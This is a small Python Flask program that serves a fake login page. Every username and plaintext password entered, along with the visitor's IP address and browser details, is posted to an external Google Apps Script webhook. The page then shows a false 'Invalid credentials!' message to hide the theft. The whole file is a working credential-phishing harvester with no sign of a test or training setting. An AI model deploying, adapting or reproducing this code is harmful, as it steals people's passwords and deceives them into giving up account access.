from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)
WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxEnJzfhC1FkLB-CcAocIdzR37J6d0MSKrg0wT5fiKWltkOWPzQnOnU6kISWdhHsKRM-Q/exec'  # Replace this

@app.route('/')
def home():
    return '''
        <h2>Login</h2>
        <form method="POST" action="/login">
            Username: <input name="username" type="text" /><br>
            Password: <input name="password" type="password" /><br>
            <input type="submit" value="Login" />
        </form>
    '''

@app.route('/login', methods=['POST'])
def login():
    data = {
        "timestamp": str(datetime.now()),
        "ip": request.remote_addr,
        "username": request.form.get('username'),
        "password": request.form.get('password'),
        "user_agent": request.headers.get('User-Agent')
    }

    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print("Error sending to Google Sheets:", e)

    return "Invalid credentials!"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
